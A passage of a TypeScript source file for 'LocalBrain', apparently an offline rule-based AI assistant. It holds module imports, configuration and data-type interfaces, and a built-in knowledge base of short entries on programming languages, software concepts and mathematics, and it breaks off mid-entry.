/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                             ║
 * ║            🧠  L O C A L  B R A I N  —  STANDALONE AI ENGINE                ║
 * ║                                                                             ║
 * ║   A fully offline AI brain that works WITHOUT any external API.             ║
 * ║   Drop-in replacement for AiBrain — same interface, zero API calls.         ║
 * ║                                                                             ║
 * ║   Capabilities:                                                             ║
 * ║     ✦ Chat — Pattern-matching + knowledge-base powered responses            ║
 * ║     ✦ Self-Learning — Learns from conversations, remembers corrections      ║
 * ║     ✦ Code Generation — Template + pattern based for 24 languages           ║
 * ║     ✦ Code Review — Rule-based static analysis                              ║
 * ║     ✦ Image Analysis — Metadata extraction from base64 image data           ║
 * ║     ✦ Knowledge Search — Search through built-in + learned knowledge        ║
 * ║     ✦ Persistence — Save and restore entire brain state                     ║
 * ║                                                                             ║
 * ║   This is a SELF-CONTAINED intelligence — no network, no API key needed.    ║
 * ║                                                                             ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

import type {
  TokenUsage,
  CodeRequest,
  CodeResult,
  CodeReviewRequest,
  CodeReviewResult,
  CodeIssue,
  ImageAnalysisRequest,
  ImageAnalysisResult,
  ProgrammingLanguage,
  ApiMessage,
  DocumentAnalysisInput,
  DocumentAnalysisOutput,
} from './types.js'

import {
  estimateComplexity,
  getCodeTemplate,
  getLanguageInfo,
  formatCode,
  isSupportedImageType,
  validateImageData,
  parseImageAnalysis,
} from './types.js'

import { TfIdfScorer } from './TfIdfScorer'
import { CodeAnalyzer } from './codemaster/CodeAnalyzer.js'
import { CodeReviewer } from './codemaster/CodeReviewer.js'
import { CodeFixer } from './codemaster/CodeFixer.js'
import { ProblemDecomposer } from './codemaster/ProblemDecomposer.js'
import { LearningEngine } from './codemaster/LearningEngine.js'
import { PerformanceAnalyzer } from './codemaster/PerformanceAnalyzer.js'
import { TypeFlowAnalyzer } from './codemaster/TypeFlowAnalyzer.js'
import { DependencyGraphAnalyzer } from './codemaster/DependencyGraphAnalyzer.js'
import { AsyncFlowAnalyzer } from './codemaster/AsyncFlowAnalyzer.js'
import { TestCoverageAnalyzer } from './codemaster/TestCoverageAnalyzer.js'
import { ArchitecturalAnalyzer } from './codemaster/ArchitecturalAnalyzer.js'
import type { CodeAnalysis, CodeReviewOutput, FixResult, TaskPlan, AnalysisLanguage } from './codemaster/types.js'

// Intelligence modules
import { SemanticEngine } from './SemanticEngine.js'
import { IntentEngine } from './IntentEngine.js'
import { ContextManager } from './ContextManager.js'
import { ReasoningEngine } from './ReasoningEngine.js'
import { MetaCognition } from './MetaCognition.js'

// Advanced intelligence modules (Phase 2)
import { SemanticMemory, createProgrammingKnowledgeGraph } from './SemanticMemory.js'
import { SemanticTrainer } from './SemanticTrainer.js'
import { AnalogicalReasoner } from './AnalogicalReasoner.js'
import { TopicModeler } from './TopicModeler.js'

// Cognitive intelligence modules (Phase 3)
import { CausalReasoner } from './CausalReasoner.js'
import { AbstractionEngine, createProgrammingAbstractionEngine } from './AbstractionEngine.js'
import { PlanningEngine } from './PlanningEngine.js'
import { CreativeEngine } from './CreativeEngine.js'

// Trading & financial intelligence modules (Phase 4)
import { TradingEngine } from './TradingEngine.js'
import { MarketAnalyzer } from './MarketAnalyzer.js'
import { PortfolioOptimizer } from './PortfolioOptimizer.js'
import { StrategyEngine } from './StrategyEngine.js'
import { DecisionEngine } from './DecisionEngine.js'
import { KnowledgeSynthesizer } from './KnowledgeSynthesizer.js'
import { EconomicAnalyzer } from './EconomicAnalyzer.js'
import { SecurityTrainer } from './SecurityTrainer.js'

// Semantic intelligence modules (Phase 5)
import { EmotionEngine } from './EmotionEngine.js'
import { TemporalReasoner } from './TemporalReasoner.js'
import { NormalizationEngine } from './NormalizationEngine.js'
import { BayesianNetwork } from './BayesianNetwork.js'
import { OntologyManager } from './OntologyManager.js'
import { DialogueManager } from './DialogueManager.js'
import { ArgumentAnalyzer } from './ArgumentAnalyzer.js'
import { NarrativeEngine } from './NarrativeEngine.js'

// Cybersecurity intelligence modules (Phase 6)
import { VulnerabilityScanner } from './VulnerabilityScanner.js'
import { ThreatModeler } from './ThreatModeler.js'
import { ExploitAnalyzer } from './ExploitAnalyzer.js'
import { NetworkForensics } from './NetworkForensics.js'

// Understanding intelligence modules (Phase 7)
import { PatternRecognizer } from './PatternRecognizer.js'
import { ConceptMapper } from './ConceptMapper.js'
import { InferenceEngine } from './InferenceEngine.js'
import { SentimentAnalyzer } from './SentimentAnalyzer.js'

// Deep intelligence modules (Phase 8)
import { DeepUnderstandingEngine } from './DeepUnderstandingEngine.js'
import { TaskOrchestrator } from './TaskOrchestrator.js'
import { KnowledgeReasoner } from './KnowledgeReasoner.js'
import { AdaptiveLearner } from './AdaptiveLearner.js'

// Intelligent coding & semantic modules (Phase 9)
import { SemanticCodeAnalyzer } from './SemanticCodeAnalyzer.js'
import { IntelligentRefactorer } from './IntelligentRefactorer.js'
import { CodeIntentPredictor } from './CodeIntentPredictor.js'
import { SemanticBridge } from './SemanticBridge.js'

// Training excellence modules (Phase 10)
import { MultiModalFusion } from './MultiModalFusion.js'
import { CurriculumOptimizer } from './CurriculumOptimizer.js'

// Deep analysis modules (Phase 11)
import { ImageAnalyzer } from './ImageAnalyzer.js'
import { DocumentAnalyzer } from './DocumentAnalyzer.js'

// Document-grounded Q&A (Phase 12 — PdfExpert)
import { PdfExpert } from './PdfExpert.js'

// Decision quality & memory modules
import { ConfidenceGate } from './ConfidenceGate.js'
import type { ConfidenceSignal, GateDecision } from './ConfidenceGate.js'
import { MemoryConsolidator } from './MemoryConsolidator.js'
import type { SessionTurn } from './MemoryConsolidator.js'

// Token budget management
import { TokenBudgetManager } from './TokenBudgetManager.js'
import type { BudgetReport } from './TokenBudgetManager.js'

// Kurdish NLP modules
import { KurdishMorphologicalAnalyzer } from './KurdishMorphologicalAnalyzer.js'
import { KurdishSentimentAnalyzer } from './KurdishSentimentAnalyzer.js'
import type { SentimentResult } from './KurdishSentimentAnalyzer.js'
import { KurdishTranslationCorpus } from './KurdishTranslationCorpus.js'

// New intelligence modules
import { HypothesisEngine } from './HypothesisEngine.js'
import { EthicalReasoner } from './EthicalReasoner.js'
import { CoreferenceResolver } from './CoreferenceResolver.js'
import { LanguageDetector } from './LanguageDetector.js'
import { DialogueActRecognizer } from './DialogueActRecognizer.js'
import { QueryDecomposer } from './QueryDecomposer.js'
import { CrossDomainTransfer } from './CrossDomainTransfer.js'
import { CounterfactualReasoner } from './CounterfactualReasoner.js'
import { UserProfileModel } from './UserProfileModel.js'
import { ConversationSummarizer } from './ConversationSummarizer.js'
import { ResponseQualityScorer } from './ResponseQualityScorer.js'
import { MultiFormatGenerator } from './MultiFormatGenerator.js'
import { AnomalyDetector } from './AnomalyDetector.js'
import { EmotionalIntelligence } from './EmotionalIntelligence.js'
import { ContextualMemoryEngine } from './ContextualMemoryEngine.js'
import { LogicalProofEngine } from './LogicalProofEngine.js'
import { CreativeProblemSolver } from './CreativeProblemSolver.js'
import { AdvancedSearchEngine } from './AdvancedSearchEngine.js'
import type { SearchWithThinkingResult } from './AdvancedSearchEngine.js'

// Meta-intelligence modules (Phase 13)
import { SelfReflectionEngine } from './SelfReflectionEngine.js'
import { ToolReasoningEngine } from './ToolReasoningEngine.js'
import { FactVerificationEngine } from './FactVerificationEngine.js'
import { ExplanationEngine } from './ExplanationEngine.js'
import { FeedbackLearner } from './FeedbackLearner.js'

// Advanced reasoning & autonomy modules (Phase 14)
import { WorkingMemoryEngine } from './WorkingMemoryEngine.js'
import { GoalManager } from './GoalManager.js'
import { StrategicPlanner } from './StrategicPlanner.js'
import { SelfModelEngine } from './SelfModelEngine.js'
import { CollaborationEngine } from './CollaborationEngine.js'

// Phase 15 — Knowledge Engineering & Reasoning Depth
import { KnowledgeGraphEngine } from './KnowledgeGraphEngine.js'
import { DebateEngine } from './DebateEngine.js'
import { AnalyticalReasoner } from './AnalyticalReasoner.js'
import { ProblemDecomposer as ProblemDecomposerEngine } from './ProblemDecomposer.js'
import { InsightExtractor } from './InsightExtractor.js'

// Phase 16 — Advanced Intelligence & Domain Expertise
import { NaturalLanguageGenerator } from './NaturalLanguageGenerator.js'
import { ScientificReasoner } from './ScientificReasoner.js'
import { DataPipelineEngine } from './DataPipelineEngine.js'
import { PersonalityEngine } from './PersonalityEngine.js'
import { CodeOptimizer } from './CodeOptimizer.js'

// Smart coding agent
import { CodeAgent } from './CodeAgent.js'
import type {
  ProjectTemplate,
  ScaffoldLanguage,
  ScaffoldResult,
  CreateFileRequest,
  CreateFileResult,
  AddToFileRequest,
  AddToFileResult,
  ExportFromFileRequest,
} from './CodeAgent.js'

import * as fs from 'fs'
import * as path from 'path'

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §1  TYPES — All types for the local brain                                  ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Configuration for the local brain. */
export interface LocalBrainConfig {
  /** Name of the local model for identification. */
  model: string
  /** Maximum response length (in characters). */
  maxResponseLength: number
  /** Temperature-like randomness factor (0 = deterministic, 1 = more varied). */
  creativity: number
  /** System prompt/personality. */
  systemPrompt: string
  /** Enable self-learning from conversations. */
  learningEnabled: boolean
  /** Maximum number of learned patterns to store. */
  maxLearnedPatterns: number

  // ── Self-Learning v2 ──

  /** Path for auto-save brain state (default: from paths.ts). Set to '' to disable. */
  autoSavePath: string
  /** Auto-save after every N learnings (default: 5). */
  autoSaveInterval: number
  /** Confidence decay rate per day (default: 0.01). Unused patterns lose confidence over time. */
  decayRate: number
  /** Minimum confidence threshold — patterns below this are auto-pruned (default: 0.1). */
  minConfidence: number
  /** Enable TF-IDF scoring for pattern matching (default: true). */
  useTfIdf: boolean
  /** Enable intelligence modules: SemanticEngine, IntentEngine, ContextManager, ReasoningEngine, MetaCognition (default: true). */
  enableIntelligence: boolean

  // ── Token Budget ──

  /** Maximum tokens per session before pausing (default: 80000). */
  maxSessionTokens: number
  /** Fraction of budget at which to warn (0-1, default: 0.85). */
  budgetWarningThreshold: number
  /** Enable token budget tracking (default: true). */
  enableBudgetTracking: boolean

  // ── Auto-Learning v3 ──

  /** How often to consolidate session memory into long-term (every N chat turns, default: 10). */
  memoryConsolidationInterval: number
  /** Enable auto-learning from conversations (default: true). */
  enableAutoLearning: boolean
}

/** A single entry in the knowledge base. */
export interface KnowledgeEntry {
  /** Unique key for this knowledge. */
  id: string
  /** Category (e.g. 'programming', 'general', 'math'). */
  category: string
  /** Keywords that trigger this knowledge. */
  keywords: string[]
  /** The actual knowledge content / response. */
  content: string
  /** How many times this entry has been used. */
  useCount: number
  /** Relevance weight (higher = more likely to be selected). */
  weight: number
  /** Source of this knowledge ('builtin' or 'learned'). */
  source: 'builtin' | 'learned'
}

/** A learned pattern from conversation. */
export interface LearnedPattern {
  /** The input pattern (what the user said). */
  inputPattern: string
  /** Keywords extracted from the input. */
  keywords: string[]
  /** The response that was accepted/corrected. */
  response: string
  /** Category of this pattern. */
  category: string
  /** How many times this pattern was reinforced. */
  reinforcements: number
  /** When this pattern was last used. */
  lastUsed: string
  /** Confidence score (0-1). Higher = more reliable. */
  confidence: number
  /** Learning source priority: 'cloud-learned' > 'user-corrected' > 'reinforced' > 'learned'. */
  priority: LearnedPatternPriority
}

/** Priority levels for learned patterns (higher value = higher priority). */
export type LearnedPatternPriority = 'learned' | 'reinforced' | 'user-corrected' | 'cloud-learned'

const PRIORITY_WEIGHTS: Record<LearnedPatternPriority, number> = {
  'learned': 1,
  'reinforced': 2,
  'user-corrected': 3,
  'cloud-learned': 4,
}

/** Conflict information for ambiguous patterns. */
export interface PatternConflict {
  query: string
  patterns: Array<{ pattern: LearnedPattern; score: number }>
}

/** Result of a knowledge search. */
export interface KnowledgeSearchResult {
  entry: KnowledgeEntry
  score: number
  matchedKeywords: string[]
}

/** Complete serializable brain state for persistence. */
export interface LocalBrainState {
  config: LocalBrainConfig
  learnedPatterns: LearnedPattern[]
  conversationHistory: ApiMessage[]
  knowledgeAdditions: KnowledgeEntry[]
  stats: LocalBrainStats
}

/** Statistics about brain usage. */
export interface LocalBrainStats {
  totalChats: number
  totalCodeGenerations: number
  totalCodeReviews: number
  totalCodeAnalyses: number
  totalCodeFixes: number
  totalDecompositions: number
  totalImageAnalyses: number
  totalLearnings: number
  patternsLearned: number
  knowledgeEntriesAdded: number
  totalCodeCompletions: number
  totalCodeExplanations: number
  totalMultiStepReasons: number
  totalMultiFileGenerations: number
  createdAt: string
  lastUsedAt: string
}

/** Result of code completion. */
export interface CodeCompletionResult {
  /** The completed code (full, including the original partial). */
  completedCode: string
  /** Just the inserted portion. */
  insertion: string
  /** Confidence in the completion (0-1). */
  confidence: number
  /** Explanation of what was inserted. */
  explanation: string
}

/** Result of code explanation. */
export interface CodeExplanationResult {
  /** High-level summary of what the code does. */
  summary: string
  /** Step-by-step breakdown. */
  steps: string[]
  /** Estimated time complexity. */
  complexity: string
  /** Potential issues found. */
  issues: string[]
  /** Detected language. */
  language: string
  /** Key concepts used. */
  concepts: string[]
}

/** Multi-step reasoning result. */
export interface ReasoningResult {
  /** The final answer/response. */
  answer: string
  /** Chain-of-thought steps. */
  steps: ReasoningStep[]
  /** Overall confidence in the answer. */
  confidence: number
  /** Time taken in ms. */
  durationMs: number
}

/** A single reasoning step. */
export interface ReasoningStep {
  /** Step type. */
  type: 'decompose' | 'plan' | 'generate' | 'review' | 'refine'
  /** Description of this step. */
  description: string
  /** Output of this step. */
  output: string
}

/** Multi-file generation result. */
export interface MultiFileResult {
  /** Generated files. */
  files: GeneratedFile[]
  /** Total lines of code. */
  totalLines: number
  /** Explanation of the generation. */
  explanation: string
}

/** A single generated file. */
export interface GeneratedFile {
  /** File path/name. */
  filename: string
  /** File content. */
  content: string
  /** Programming language. */
  language: string
  /** Lines of code. */
  lines: number
}

/** User preferences for coding style. */
export interface UserPreferences {
  /** Indentation preference. */
  indentation: 'tabs' | 'spaces-2' | 'spaces-4'
  /** Quote preference. */
  quotes: 'single' | 'double'
  /** Semicolons preference (JS/TS). */
  semicolons: boolean
  /** Preferred naming convention. */
  naming: 'camelCase' | 'snake_case' | 'PascalCase'
  /** Preferred libraries per domain. */
  preferredLibraries: Record<string, string>
  /** Last updated timestamp. */
  lastUpdated: string
}

/** Conversation context for multi-turn memory. */
export interface ConversationContext {
  /** Current file being discussed. */
  currentFile: string | null
  /** Current function/method in context. */
  currentFunction: string | null
  /** Current project/topic. */
  currentProject: string | null
  /** Current programming language. */
  currentLanguage: string | null
  /** Stack of topics discussed. */
  topicStack: string[]
  /** Extracted facts from conversation. */
  facts: string[]
}

/** Refactoring suggestion. */
export interface RefactoringSuggestion {
  /** Type of code smell. */
  smell: string
  /** Location in code. */
  location: string
  /** Description of the issue. */
  description: string
  /** Suggested refactoring. */
  suggestion: string
  /** Refactored code (if available). */
  refactoredCode?: string
  /** Priority level. */
  priority: 'high' | 'medium' | 'low'
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §2  KNOWLEDGE BASE — Built-in intelligence                                 ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Built-in knowledge the brain starts with. */
function buildKnowledgeBase(): KnowledgeEntry[] {
  const entries: KnowledgeEntry[] = []
  let id = 0
  const add = (category: string, keywords: string[], content: string, weight = 1) => {
    entries.push({ id: `kb-${id++}`, category, keywords, content, useCount: 0, weight, source: 'builtin' })
  }

  // ── Programming Languages ──
  add('programming', ['typescript', 'ts', 'type', 'types'],
    'TypeScript is a typed superset of JavaScript. Key features: static types, interfaces, generics, enums, union types, type guards, decorators. Use `tsc` to compile. Configure with tsconfig.json. Best practices: use strict mode, prefer interfaces over types for objects, use readonly for immutability.', 1.2)

  add('programming', ['javascript', 'js', 'node', 'nodejs'],
    'JavaScript is the language of the web. Key features: closures, prototypes, async/await, promises, ES modules, destructuring, spread operator. Runtime: Node.js (server), browsers (client). Use const/let (never var), arrow functions for callbacks, async/await over raw promises.', 1.2)

  add('programming', ['python', 'py', 'pip'],
    'Python is a versatile, readable language. Key features: dynamic typing, list comprehensions, generators, decorators, context managers, type hints. Package manager: pip. Best practices: follow PEP 8, use type hints, virtual environments, f-strings for formatting.', 1.2)

  add('programming', ['rust', 'cargo', 'ownership', 'borrow'],
    'Rust is a systems language focused on safety. Key features: ownership system, borrowing, lifetimes, pattern matching, traits, zero-cost abstractions. Package manager: Cargo. Best practices: prefer &str over String for parameters, use Result for error handling, leverage the type system.', 1.1)

  add('programming', ['go', 'golang', 'goroutine'],
    'Go is designed for simplicity and concurrency. Key features: goroutines, channels, interfaces, defer, error handling, garbage collection. Package manager: go modules. Best practices: handle all errors, use short variable names, write table-driven tests.', 1.1)

  add('programming', ['java', 'jvm', 'spring'],
    'Java is an object-oriented language for enterprise applications. Key features: strong typing, generics, lambdas, streams API, concurrency utilities, extensive standard library. Build tools: Maven, Gradle. Best practices: SOLID principles, use Optional, prefer composition over inheritance.', 1.0)

  add('programming', ['c', 'c language', 'pointer', 'malloc'],
    'C is a low-level systems programming language. Key features: manual memory management, pointers, structs, preprocessor macros, direct hardware access. Best practices: always free allocated memory, check return values, use const for read-only data, avoid buffer overflows.', 1.0)

  add('programming', ['cpp', 'c++', 'class', 'template'],
    'C++ extends C with OOP and modern features. Key features: classes, templates, RAII, smart pointers, STL, move semantics, constexpr. Best practices: use smart pointers (unique_ptr, shared_ptr), prefer references over pointers, follow the Rule of Five.', 1.0)

  add('programming', ['csharp', 'c#', 'dotnet', '.net'],
    'C# is a modern OOP language for the .NET platform. Key features: LINQ, async/await, generics, properties, events, pattern matching, nullable reference types. Best practices: use async/await for I/O, LINQ for collections, dependency injection.', 1.0)

  add('programming', ['swift', 'ios', 'xcode'],
    'Swift is Apple\'s language for iOS/macOS development. Key features: optionals, protocols, closures, value types, generics, property wrappers, concurrency with async/await. Best practices: use guard for early returns, prefer value types, leverage protocol-oriented design.', 1.0)

  add('programming', ['kotlin', 'android'],
    'Kotlin is a modern JVM language, official for Android. Key features: null safety, data classes, coroutines, extension functions, sealed classes, smart casts. Best practices: use data classes for DTOs, coroutines for async work, extension functions for utility.', 1.0)

  add('programming', ['ruby', 'rails', 'gem'],
    'Ruby is a dynamic, elegant language. Key features: blocks, mixins, metaprogramming, duck typing, symbols, everything is an object. Framework: Rails. Best practices: follow Ruby style guide, use blocks/procs, leverage metaprogramming wisely.', 0.9)

  add('programming', ['php', 'laravel', 'composer'],
    'PHP powers most of the web. Key features: type declarations, traits, anonymous classes, generators, named arguments, attributes. Framework: Laravel. Best practices: use strict types, PSR standards, type declarations, Composer for dependencies.', 0.9)

  add('programming', ['sql', 'database', 'query', 'select'],
    'SQL is the standard language for relational databases. Key operations: SELECT, INSERT, UPDATE, DELETE, JOIN, GROUP BY, subqueries, window functions, indexes. Best practices: use parameterized queries (prevent SQL injection), normalize data, add proper indexes.', 1.1)

  add('programming', ['html', 'web', 'markup', 'dom'],
    'HTML is the foundation of web pages. Key elements: semantic tags (header, nav, main, footer), forms, tables, links, media. Best practices: use semantic HTML, ARIA attributes for accessibility, valid nesting, responsive meta viewport tag.', 0.9)

  add('programming', ['css', 'style', 'flexbox', 'grid'],
    'CSS styles web pages. Key features: Flexbox, Grid, custom properties (variables), media queries, animations, transitions, pseudo-elements. Best practices: use CSS variables, mobile-first responsive design, BEM naming convention, avoid !important.', 0.9)

  add('programming', ['bash', 'shell', 'script', 'terminal'],
    'Bash is the standard Unix shell scripting language. Key features: pipes, redirections, variables, loops, functions, conditionals, command substitution. Best practices: quote variables, use set -euo pipefail, check exit codes, use shellcheck.', 1.0)

  // ── Software Concepts ──
  add('concepts', ['algorithm', 'algorithms', 'complexity', 'big o', 'sort', 'search algorithm'],
    'Common algorithms: Binary Search O(log n), Merge Sort O(n log n), Quick Sort O(n log n) avg, BFS/DFS O(V+E), Dijkstra O(V² or V log V with heap), Dynamic Programming (memoization + tabulation). Choose based on data size and constraints.', 1.3)

  add('concepts', ['data structure', 'data structures', 'array', 'list', 'tree', 'hash'],
    'Key data structures: Array (O(1) access), LinkedList (O(1) insert), HashMap (O(1) avg lookup), Stack/Queue (LIFO/FIFO), Binary Tree (O(log n) ops), Heap (O(log n) insert/extract), Graph (adjacency list/matrix). Choose based on access patterns.', 1.3)

  add('concepts', ['design pattern', 'patterns', 'singleton', 'factory', 'observer'],
    'Important design patterns: Singleton (one instance), Factory (object creation), Observer (event system), Strategy (swappable algorithms), Adapter (interface compatibility), Decorator (add behavior), Command (encapsulate actions), Builder (step-by-step construction).', 1.2)

  add('concepts', ['api', 'rest', 'http', 'endpoint'],
    'REST API best practices: Use proper HTTP methods (GET/POST/PUT/DELETE), status codes (200 OK, 201 Created, 400 Bad Request, 404 Not Found, 500 Server Error), JSON responses, versioning (/v1/), authentication (JWT, OAuth), rate limiting, CORS handling.', 1.2)

  add('concepts', ['git', 'version control', 'branch', 'commit', 'merge'],
    'Git is the standard version control system. Key commands: git init, add, commit, push, pull, branch, merge, rebase, stash, log, diff. Best practices: write clear commit messages, use feature branches, rebase for clean history, never force push shared branches.', 1.2)

  add('concepts', ['testing', 'test', 'unit test', 'integration test', 'tdd'],
    'Testing levels: Unit tests (individual functions), Integration tests (components together), E2E tests (full system). Patterns: Arrange-Act-Assert, Given-When-Then. Tools: Jest (JS), pytest (Python), JUnit (Java). Aim for meaningful coverage, test edge cases.', 1.1)

  add('concepts', ['security', 'vulnerability', 'xss', 'injection', 'auth'],
    'Security essentials: Input validation (never trust user input), parameterized queries (prevent SQL injection), output encoding (prevent XSS), HTTPS everywhere, secure password hashing (bcrypt), JWT for stateless auth, CORS configuration, rate limiting, CSP headers.', 1.3)

  add('concepts', ['database', 'sql', 'nosql', 'orm'],
    'Database types: Relational (PostgreSQL, MySQL — structured data, ACID), Document (MongoDB — flexible schema), Key-Value (Redis — caching), Graph (Neo4j — relationships). Choose based on data model, consistency needs, and scale requirements.', 1.1)

  add('concepts', ['docker', 'container', 'kubernetes', 'k8s', 'devops'],
    'Docker containerizes applications. Key: Dockerfile (build image), docker-compose (multi-container), volumes (persistent data), networks (container communication). Kubernetes orchestrates containers at scale: pods, services, deployments, ingress.', 1.0)

  add('concepts', ['async', 'await', 'promise', 'concurrent', 'parallel'],
    'Asynchronous programming handles operations without blocking. Patterns: Callbacks (oldest), Promises (chainable), Async/Await (readable). Concurrency: multiple tasks progress together. Parallelism: multiple tasks execute simultaneously. Use async for I/O-bound, parallel for CPU-bound.', 1.1)

  // ── General Knowledge ──
  add('general', ['hello', 'hi', 'hey', 'greet', 'good morning', 'good evening'],
    'Hello! I am LocalBrain — a standalone AI that works completely offline. I can chat, write code in 24 languages, review code for bugs, and I learn from our conversations. How can I help you?', 1.5)

  add('general', ['help', 'what can you do', 'capabilities', 'features'],
    'I can help you with: 1) Chat — Answer questions about programming and technology, 2) Write Code — Generate code in 24 languages, 3) Review Code — Find bugs, security issues, and style problems, 4) Search — Find information in my knowledge base, 5) Learn — I improve from our conversations. Try asking me to write some code!', 1.5)

  add('general', ['who are you', 'what are you', 'your name'],
    'I am LocalBrain — a standalone AI intelligence that runs entirely on your machine. No API keys, no internet required. I use pattern matching, knowledge bases, and self-learning to assist you. I specialize in programming (24 languages), code review, and technical topics.', 1.5)

  add('general', ['thank', 'thanks', 'appreciate'],
    'You\'re welcome! I\'m always here to help. If my response wasn\'t quite right, you can correct me and I\'ll learn from it for next time.', 1.0)

  // ── Math ──
  add('math', ['math', 'calculate', 'formula', 'equation'],
    'I can help with math concepts! Common formulas: Area of circle = πr², Pythagorean theorem: a² + b² = c², Quadratic formula: x = (-b ± √(b²-4ac)) / 2a. I can explain mathematical concepts and help structure code for calculations.', 1.0)

  add('math', ['fibonacci', 'recursive', 'recursion'],
    'Fibonacci sequence: each number is the sum of the two preceding ones (0, 1, 1, 2, 3, 5, 8, 13...). Recursive: O(2^n) — very slow. Memoized: O(n). Iterative: O(n) time, O(1) space — best. Dynamic programming transforms exponential recursion into linear iteration.', 1.1)

  // ══════════════════════════════════════════════════════════════════════════════
  // ║  MATHEMATICS — Comprehensive math knowledge base                          ║
  // ══════════════════════════════════════════════════════════════════════════════

  // ── Algebra ──
  add('math', ['algebra', 'variable', 'solve', 'equation', 'linear equation'],
    'Algebra fundamentals: Variables represent unknown values. Linear equation: ax + b = 0 → x = -b/a. Systems of equations: substitution, elimination, or matrix methods. Quadratic: ax² + bx + c = 0 → x = (-b ± √(b²-4ac)) / 2a. Discriminant Δ = b²-4ac: Δ>0 → 2 real roots, Δ=0 → 1 repeated root, Δ<0 → 2 complex roots. Factoring: find factors such that a·c = product, a+c = sum. Polynomial long division and synthetic division for higher degrees.', 1.3)

  add('math', ['polynomial', 'degree', 'factor', 'root', 'zero'],
    'Polynomials: f(x) = aₙxⁿ + aₙ₋₁xⁿ⁻¹ + ... + a₁x + a₀. Degree n has at most n real roots. Fundamental Theorem of Algebra: degree n polynomial has exactly n complex roots (counting multiplicity). Factor theorem: (x-a) is a factor iff f(a)=0. Rational root theorem: possible rational roots are ±(factors of a₀)/(factors of aₙ). Vieta\'s formulas: sum of roots = -aₙ₋₁/aₙ, product of roots = (-1)ⁿa₀/aₙ. Descartes\' rule of signs counts possible positive/negative real roots.', 1.2)

  add('math', ['exponent', 'logarithm', 'log', 'power', 'exponential'],
    'Exponents and logarithms: aᵐ · aⁿ = aᵐ⁺ⁿ, (aᵐ)ⁿ = aᵐⁿ, a⁰ = 1, a⁻ⁿ = 1/aⁿ. Logarithms: log_a(x) = y ↔ aʸ = x. Properties: log(ab) = log(a)+log(b), log(a/b) = log(a)-log(b), log(aⁿ) = n·log(a). Change of base: log_a(x) = ln(x)/ln(a). Natural log: ln(e) = 1. Exponential growth: N(t) = N₀·eᵏᵗ. Half-life: t½ = ln(2)/k. e ≈ 2.71828... is the base of natural logarithms.', 1.2)

  add('math', ['inequality', 'absolute value', 'interval'],
    'Inequalities: When multiplying/dividing by a negative number, flip the sign. |x| < a means -a < x < a. |x| > a means x < -a or x > a. Solving quadratic inequalities: factor, find roots, test intervals. Triangle inequality: |a+b| ≤ |a|+|b|. AM-GM inequality: (a+b)/2 ≥ √(ab) for a,b ≥ 0. Cauchy-Schwarz: (Σaᵢbᵢ)² ≤ (Σaᵢ²)(Σbᵢ²). Interval notation: [a,b] closed, (a,b) open, [a,b) half-open.', 1.1)

  add('math', ['complex number', 'imaginary', 'complex', 'i squared'],
    'Complex numbers: z = a + bi where i² = -1. Modulus: |z| = √(a²+b²). Conjugate: z̄ = a - bi. Polar form: z = r(cosθ + i·sinθ) = r·e^(iθ). De Moivre\'s theorem: (r·e^(iθ))ⁿ = rⁿ·e^(inθ). Euler\'s formula: e^(iπ) + 1 = 0 (most beautiful equation). Roots of unity: the n-th roots of 1 are e^(2πik/n) for k=0,1,...,n-1, equally spaced on the unit circle. Fundamental theorem: every polynomial equation has a solution in ℂ.', 1.2)

  add('math', ['matrix', 'matrices', 'determinant', 'inverse matrix', 'eigenvalue'],
    'Linear algebra — Matrices: m×n array of numbers. Operations: addition, scalar multiplication, matrix multiplication (AB ≠ BA generally). Determinant: det(A) = ad-bc for 2×2. Inverse: A⁻¹ exists iff det(A) ≠ 0; A·A⁻¹ = I. Eigenvalues λ: det(A - λI) = 0. Eigenvectors v: Av = λv. Trace: tr(A) = sum of diagonal = sum of eigenvalues. Rank: number of linearly independent rows/columns. Applications: systems of equations, transformations, data science (PCA), quantum mechanics.', 1.3)

  add('math', ['vector', 'dot product', 'cross product', 'vector space', 'linear algebra'],
    'Vectors and linear algebra: Vector = magnitude + direction. Dot product: a·b = |a||b|cosθ = a₁b₁+a₂b₂+a₃b₃. Cross product: a×b = |a||b|sinθ n̂ (perpendicular to both). Properties: dot product → scalar (projections, work), cross product → vector (torque, area). Vector space: closed under addition and scalar multiplication. Basis: minimal spanning set. Dimension = number of basis vectors. Linear independence: no vector is a combination of others. Gram-Schmidt: orthogonalize a basis. Subspace, span, null space, column space.', 1.3)

  add('math', ['linear transformation', 'basis', 'dimension', 'rank', 'null space'],
    'Linear transformations: T(αu + βv) = αT(u) + βT(v). Represented by matrices. Kernel (null space): {v : T(v) = 0}. Image (range): {T(v) : v in domain}. Rank-nullity theorem: dim(kernel) + dim(image) = dim(domain). Change of basis: [T]_B\' = P⁻¹[T]_B P. Diagonalization: A = PDP⁻¹ where D = diagonal of eigenvalues, P = eigenvector matrix. Singular Value Decomposition: A = UΣVᵀ (any matrix). Applications: rotations, reflections, projections, data compression.', 1.2)

  // ── Calculus ──
  add('math', ['derivative', 'differentiation', 'calculus', 'rate of change'],
    'Calculus — Derivatives: f\'(x) = lim[h→0] (f(x+h)-f(x))/h = instantaneous rate of change. Rules: d/dx[xⁿ] = nxⁿ⁻¹, d/dx[sin x] = cos x, d/dx[eˣ] = eˣ, d/dx[ln x] = 1/x. Chain rule: d/dx[f(g(x))] = f\'(g(x))·g\'(x). Product rule: (fg)\' = f\'g + fg\'. Quotient rule: (f/g)\' = (f\'g - fg\')/g². Applications: velocity = dx/dt, acceleration = dv/dt, optimization (set f\'=0), related rates, tangent lines.', 1.3)

  add('math', ['integral', 'integration', 'antiderivative', 'area under curve'],
    'Calculus — Integration: ∫f(x)dx = F(x) + C where F\'(x) = f(x). Fundamental Theorem: ∫ₐᵇ f(x)dx = F(b) - F(a). Common: ∫xⁿdx = xⁿ⁺¹/(n+1), ∫eˣdx = eˣ, ∫sin(x)dx = -cos(x), ∫1/x dx = ln|x|. Techniques: substitution (u-sub), integration by parts (∫udv = uv - ∫vdu), partial fractions, trigonometric substitution. Applications: area between curves, volume of revolution (disk/shell method), arc length, work, center of mass.', 1.3)

  add('math', ['limit', 'continuity', 'epsilon delta', 'convergence'],
